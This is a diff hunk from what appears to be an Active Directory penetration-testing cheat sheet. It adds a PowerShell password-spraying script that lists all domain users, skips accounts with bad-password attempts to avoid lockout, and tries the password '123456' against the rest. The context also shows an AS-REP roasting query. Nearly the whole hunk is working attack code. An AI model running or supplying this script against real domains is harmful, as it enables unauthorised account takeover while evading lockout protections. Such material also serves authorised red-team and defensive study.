@@ -645,6 +645,58 @@ Write-Host $users.Count users supplied; $users | % {
 }
 ```
 
+
+
+```
+# Will spray only users that currently have 0 bad password attempts
+# Dependency: ActiveDirectory module (not PowerView)
+
+function Get-BadPasswordCount {
+    param(
+        [string]$Username,
+        [string]$Domain = (Get-ADDomain).DNSRoot
+    )
+    try {
+        $user = Get-ADUser -Identity $Username -Server (Get-ADDomainController -DomainName $Domain -Discover).HostName `
+                -Properties BadPwdCount
+        return $user.BadPwdCount
+    }
+    catch {
+        Write-Host "[-] Could not get BadPwdCount for $Username" -ForegroundColor Yellow
+        return -1
+    }
+}
+
+# Gather users
+$users   = Get-ADUser -Filter * -Properties SamAccountName | Select-Object -ExpandProperty SamAccountName
+$domain  = (Get-ADDomain).DNSRoot
+$password = "123456"
+
+Write-Host "$($users.Count) users supplied"
+foreach ($user in $users) {
+    $badPasswordCount = Get-BadPasswordCount -Username $user -Domain $domain
+    if ($badPasswordCount -eq 0) {
+        Write-Host "Spraying : " -NoNewline
+        Write-Host "$user" -ForegroundColor Green
+
+        $secPassword = ConvertTo-SecureString -String $password -AsPlainText -Force
+        $credentials = New-Object System.Management.Automation.PSCredential ("$domain\$user",$secPassword)
+
+        try {
+            # example: run whoami on success
+            Start-Process powershell -Credential $credentials -ArgumentList "-Command whoami"
+        }
+        catch {
+            Write-Host "[-] Authentication failed for $user" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "Ignoring $user with BadPwdCount=$badPasswordCount" -ForegroundColor Red
+    }
+}
+```
+
+
+
 ## 6.1 Do not require Kerberos preauthentication (AS-REP roasting)
 ```powershell
 Get-ADUser -LdapFilter "(&(objectclass=user)(objectcategory=user)(useraccountcontrol:1.2.840.113556.1.4.803:=4194304))" | Format-Table Name, DistinguishedName
